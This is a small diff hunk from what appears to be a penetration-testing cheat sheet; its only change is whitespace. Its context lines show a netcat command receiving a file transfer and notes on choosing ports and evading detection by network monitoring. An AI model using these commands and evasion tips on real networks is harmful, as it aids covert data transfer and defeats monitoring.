@@ -28,7 +28,7 @@
    > To accept and receive data transfer: ```nc {IP} {PORT} > {DIRECTORY}/{FILE}```
 
 ## Additional Security Notes:
-
+ 
 - **Port Selection**: Use non-standard ports to avoid detection. Common ports like 80, 443, 53 might be less suspicious.
 - **Firewall Considerations**: Ensure the target ports are not blocked by firewall rules.
 - **Detection Evasion**: These connections may be detected by network monitoring tools. Use sparingly in authorized penetration testing only.
